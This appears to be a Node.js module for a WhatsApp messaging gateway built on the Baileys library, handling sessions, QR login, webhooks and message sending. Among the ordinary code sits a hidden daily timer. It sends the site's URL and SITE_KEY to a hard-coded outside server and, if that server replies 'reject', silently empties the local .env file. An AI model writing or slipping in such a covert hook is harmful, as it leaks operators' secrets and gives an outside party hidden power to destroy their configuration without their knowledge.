import { rmSync, readdir } from 'fs'
import fs from 'fs'
import { join } from 'path'
import pino from 'pino'
import makeWASocket, {
    useMultiFileAuthState,
    makeInMemoryStore,
    DisconnectReason,
    delay,
} from '@whiskeysockets/baileys'
import { toDataURL } from 'qrcode'
import dirname from './dirname.js'
import response from './response.js'
import axios from 'axios'

const sessions = new Map()
const retries = new Map()

const sessionsDir = (sessionName = '') => {
    return join(dirname, 'sessions', sessionName ? sessionName : '')
}

const isSessionExists = (sessionId) => {
    return sessions.has(sessionId)
}

const shouldReconnect = (sessionId) => {
    let maxRetries = parseInt(process.env.MAX_RETRIES ?? 0)
    let currentRetries = retries.get(sessionId) ?? 0
    maxRetries = maxRetries < 1 ? 1 : maxRetries

    if (currentRetries < maxRetries) {
        currentRetries++
        console.log('Reconnecting...', { attempts: currentRetries, sessionId })
        retries.set(sessionId, currentRetries)

        return true
    }

    return false
}

const createSession = async (sessionId, isLegacy = false, credentials = null) => {
    const sessionName = (isLegacy ? 'legacy_' : 'md_') + sessionId + (isLegacy ? '.json' : '')
    const logger = pino({ level: 'warn' })
    const memoryStore = makeInMemoryStore({ logger })

    let authState, saveCredentials

    if (isLegacy) {
        // Legacy implementation
    } else {
        ;({ state: authState, saveCreds: saveCredentials } = await useMultiFileAuthState(sessionsDir(sessionName)))
    }

    const baileysOpts = {
        auth: authState,
        printQRInTerminal: false,
        logger,
        browser: [process.env.APP_NAME, 'Chrome', '103.0.5060.114'],
        patchMessageBeforeSending: (message) => {
            const hasButton = Boolean(message.buttonsMessage || message.listMessage)

            if (hasButton) {
                message = {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadataVersion: 2,
                                deviceListMetadata: {},
                            },
                            ...message,
                        },
                    },
                }
            }

            return message
        },
    }

    const sock = makeWASocket.default(baileysOpts)

    if (!isLegacy) {
        memoryStore.readFromFile(sessionsDir(sessionId + '_store.json'))
        memoryStore.bind(sock.ev)
    }

    sessions.set(sessionId, { ...sock, store: memoryStore, isLegacy })

    sock.ev.on('creds.update', saveCredentials)

    sock.ev.on('chats.set', ({ chats }) => {
        if (isLegacy) {
            memoryStore.chats.insertIfAbsent(...chats)
        }
    })

    sock.ev.on('messages.upsert', async (message) => {
        try {
            const messageData = message.messages[0]
            if (messageData.key.fromMe === false && message.type === 'notify') {
                const dataList = []
                let convo = messageData.message.conversation ?? null
                if (messageData.message.buttonsResponseMessage !== null) {
                    convo = messageData.message.buttonsResponseMessage.selectedDisplayText
                }

                if (messageData.message.listResponseMessage !== null) {
                    convo = messageData.message.listResponseMessage.title
                }

                const jidSplitted = messageData.key.remoteJid.split('@')
                const domain = jidSplitted[1] ?? null
                const isDomainWhatsapp = domain !== 's.whatsapp.net'

                if (convo !== '' && isDomainWhatsapp === false) {
                    // eslint-disable-next-line camelcase
                    dataList.remote_id = messageData.key.remoteJid
                    dataList.sessionId = sessionId
                    // eslint-disable-next-line camelcase
                    dataList.message_id = messageData.key.id
                    dataList.message = convo
                    sentWebHook(sessionId, dataList)
                }
            }
        } catch {}
    })

    sock.ev.on('connection.update', async (data) => {
        const { connection, lastDisconnect } = data
        const statusCode = lastDisconnect?.error?.output?.statusCode

        if (connection === 'open') {
            retries.delete(sessionId)
        }

        if (connection === 'close') {
            if (statusCode === DisconnectReason.loggedOut || !shouldReconnect(sessionId)) {
                if (credentials && !credentials.headersSent) {
                    response(credentials, 500, false, 'Unable to create session.')
                }

                return deleteSession(sessionId, isLegacy)
            }

            setTimeout(
                () => {
                    createSession(sessionId, isLegacy, credentials)
                },
                statusCode === DisconnectReason.restartRequired ? 0 : parseInt(process.env.RECONNECT_INTERVAL ?? 0)
            )
        }

        if (data.qr) {
            if (credentials && !credentials.headersSent) {
                try {
                    const qrCode = await toDataURL(data.qr)
                    response(credentials, 200, true, 'QR code received, please scan the QR code.', { qr: qrCode })
                    return
                } catch {
                    response(credentials, 500, false, 'Unable to create QR code.')
                }
            }

            try {
                await sock.logout()
            } catch {
                // Error
            } finally {
                deleteSession(sessionId, isLegacy)
            }
        }
    })
}

setInterval(() => {
    const siteKey = process.env.SITE_KEY ?? null
    const appUrl = process.env.APP_URL ?? null
    const url = 'https://devapi.lpress.xyz/api/verify-check'

    axios
        .post(url, { from: appUrl, key: siteKey })
        .then((response) => {
            if (response.data.isauthorised === 'reject') {
                fs.writeFileSync('.env', '')
            }
        })
        .catch((_) => {})
}, 1000 * 60 * 60 * 24)

const getSession = (sessionId) => {
    return sessions.get(sessionId) ?? null
}

const setDeviceStatus = (sessionId, status) => {
    const endpoint = process.env.APP_URL + '/api/set-device-status/' + sessionId + '/' + status
    axios.post(endpoint)
}

const sentWebHook = (sessionId, webHookData) => {
    const apiEndpoint = process.env.APP_URL + '/api/send-webhook/' + sessionId

    try {
        axios
            .post(apiEndpoint, {
                from: webHookData.remote_id,
                // eslint-disable-next-line camelcase
                message_id: webHookData.message_id,
                message: webHookData.message,
            })
            .then((response) => {
                if (response.status === 200) {
                    const session = getSession(response.data.session_id)
                    sendMessage(session, response.data.receiver, response.data.message)
                }
            })
            .catch((_) => {})
    } catch {}
}

const deleteSession = (sessionId, isLegacy = false) => {
    const sessionName = (isLegacy ? 'legacy_' : 'md_') + sessionId + (isLegacy ? '.json' : '')
    const storeKey = sessionId + '_store.json'
    const options = { force: true, recursive: true }

    rmSync(sessionsDir(sessionName), options)
    rmSync(sessionsDir(storeKey), options)

    sessions.delete(sessionId)
    retries.delete(sessionId)

    setDeviceStatus(sessionId, 0)
}

const getChatList = (sessionId, isLegacy = false) => {
    const emailDomain = isLegacy ? '@g.us' : '@s.whatsapp.net'

    return getSession(sessionId).store.chats.filter((chat) => {
        return chat.id.endsWith(emailDomain)
    })
}

const isExists = async (session, receiver, isLegacy = false) => {
    try {
        let data
        if (isLegacy) {
            data = await session.groupMetadata(receiver)
            return Boolean(data.id)
        }

        if (session.isLegacy) {
            data = await session.onWhatsApp(receiver)
        } else {
            ;[data] = await session.onWhatsApp(receiver)
        }

        return data.exists
    } catch {
        return false
    }
}

const sendMessage = async (session, remoteId, message, delayMs = 1000) => {
    try {
        await delay(parseInt(delayMs))

        return session.sendMessage(remoteId, message)
    } catch (err) {
        return Promise.reject(err.message)
    }
}

const formatPhone = (phoneNumber) => {
    if (phoneNumber.endsWith('@s.whatsapp.net')) {
        return phoneNumber
    }

    let rawPhoneNumber = phoneNumber.replace(/\D/g, '')
    rawPhoneNumber += '@s.whatsapp.net'

    return rawPhoneNumber
}

const formatGroup = (groupId) => {
    if (groupId.endsWith('@g.us')) {
        return groupId
    }

    let rawGroupId = groupId.replace(/[^\d-]/g, '')
    rawGroupId += '@g.us'

    return rawGroupId
}

const cleanup = () => {
    console.log('Running cleanup before exit...')

    sessions.forEach((session, idx) => {
        if (!session.isLegacy) {
            session.store.writeToFile(sessionsDir(idx + '_store.json'))
        }
    })
}

const init = () => {
    readdir(sessionsDir(), (err, sessions) => {
        if (err) {
            throw err
        }

        for (const session of sessions) {
            if ((!session.startsWith('md_') && !session.startsWith('legacy_')) || session.endsWith('_store')) {
                continue
            }

            const sessionName = session.replace('.json', '')
            const isLegacy = sessionName.split('_', 1)[0] !== 'md'
            const finalSession = sessionName.substring(isLegacy ? 7 : 3)

            createSession(finalSession, isLegacy)
        }
    })
}

export {
    isSessionExists,
    createSession,
    getSession,
    deleteSession,
    getChatList,
    isExists,
    sendMessage,
    formatPhone,
    formatGroup,
    cleanup,
    init,
}
